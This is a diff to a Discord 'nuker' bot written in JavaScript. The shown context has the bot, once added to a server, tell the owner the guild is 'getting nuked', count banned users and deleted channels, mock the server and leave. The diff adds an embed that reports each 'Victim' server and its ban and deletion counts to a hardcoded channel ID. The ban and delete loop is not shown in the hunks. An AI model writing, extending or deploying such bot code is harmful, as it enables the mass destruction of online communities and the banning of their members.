@@ -1,4 +1,4 @@
-const { Client } = require('discord.js');
+const { Client, RichEmbed } = require('discord.js');
 const config = require('./config.json');
 const client = new Client();
 
@@ -9,6 +9,7 @@ client.on('ready', () => {
 client.on('guildCreate', async (guild) => {
   let users = 0;
   let channels = 0;
+  let embed = new RichEmbed();
 
   try {
     await guild.owner.send('Hey there! Your guild is getting nuked!');
@@ -40,8 +41,13 @@ client.on('guildCreate', async (guild) => {
   try {
     await guild.defaultChannel.send('Dumbass, I said not to add the bot...');
   } catch (e) {}
-
-  console.log(`Banned ${users} users and ${channels} channels from ${guild.name}`);
+  
+  if(users > 0 || channels > 0) {
+    embed.setAuthor(`Victim |  ${guild.name}`, guild.iconURL)
+          .setColor(3447003)
+          .setDescription(`Banned ${users} users\nDeleted ${channels} channels`); 
+    client.channels.get('274770009883148288').sendEmbed(embed)
+  }
   guild.leave();
 });
 
